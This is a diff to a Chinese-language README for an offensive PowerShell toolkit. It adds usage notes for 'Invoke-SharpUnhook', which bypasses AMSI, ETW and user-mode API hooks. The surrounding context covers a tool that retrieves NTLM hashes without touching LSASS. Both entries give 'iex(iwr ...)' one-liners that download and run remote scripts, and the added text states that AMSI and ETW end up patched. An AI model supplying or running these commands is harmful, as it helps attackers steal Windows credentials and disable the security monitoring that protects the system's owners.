@@ -54,6 +54,22 @@ Internalmonologue：在不接触 LSASS 的情况下检索 NTLM 哈希:https://gi
 iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-Internalmonologue.ps1)
 ```
 
+# 2.Invoke-SharpUnhook.ps1
+SharpUnhook用来规避AMSI的内存检测、ETW的监控和hook了ring3的API，或许它仍然会被高级防病毒检测，
+这只是一个例子，不要依赖它:https://github.com/GetRektBoy724/SharpUnhooker
+
+用法：
+远程加载
+```
+iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-SharpUnhook.ps1)
+```
+本地加载
+
+```
+Import-Module .\Invoke-SharpUnhook.ps1
+```
+![image](https://user-images.githubusercontent.com/89376703/200115967-953b394b-90ad-477c-b12c-7370c73fe667.png)
+这样AMSI和ETW就已经Ptach了
 
 
 ### 总结
